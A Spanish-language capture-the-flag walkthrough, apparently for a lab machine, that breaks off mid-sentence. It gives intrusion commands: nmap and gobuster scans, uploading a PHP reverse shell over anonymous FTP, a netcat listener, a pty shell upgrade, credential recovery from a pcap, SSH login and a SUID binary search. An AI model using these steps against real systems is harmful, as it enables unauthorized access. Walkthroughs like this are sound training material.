
Lo primero que haremos será hacer un nmap con el siguiente comando: sudo nmap -A -sV -sC -T4 -p- --defeat-rst-ratelimit 10.10.92.79


Ahora intentamos hacer fuzzing gobuster dir -u http://10.10.92.79/ -w /usr/share/wordlists/dirb/big.txt y miramos y hay un /files si accedemos pordemos ver que hay un servidor ftp


Intentamos conectarnos con anonymous con el siguiente comando: ftp anonymous@10.10.92.79

IMG01

Una vez dentro haremos un put e intentaremos meter una reverse shell: put /home/kali/Desktop/php-reverse-shell.php ./php-reverse-shell.php


Y ahora la ejecutamos y ponemos en escucha nuestro kali linux: nc -lvnp 1234  y ya hemos entrado, ahora vamos a upgradear la shell con: python -c 'import pty; pty.spawn("/bin/bash")'

IMG02

Y ya tenemos la primera flag.

Ahora hacemos un ls y vemos un directorio sospechoso, dentro vemos un pcap, nos lo pasamos a nuestra maquina con el comando: cp /incidents/suspicious.pcapng /var/www/html/files/ftp


Y si lo abrimos con el wireshark veremos que hay varias peticiones al puerto 4444, le damos a follow --> TCP Stream y podemos ver algunos comandos donde encontramos la contraseña de lennie.

IMG03

Y ahora intentamos entrar por ssh con el siguiente comando: ssh lennie@10.10.92.79 y ya estamos dentro.
IMG04

Si hacemos un cat user.txt vemos la segunda flag.

Ahora haremos el siguiente comando para ver los binarios: find / -perm -u=s -type f 2>/dev/null

IMG04


Y ahora nos vamos a gtfo bins y 

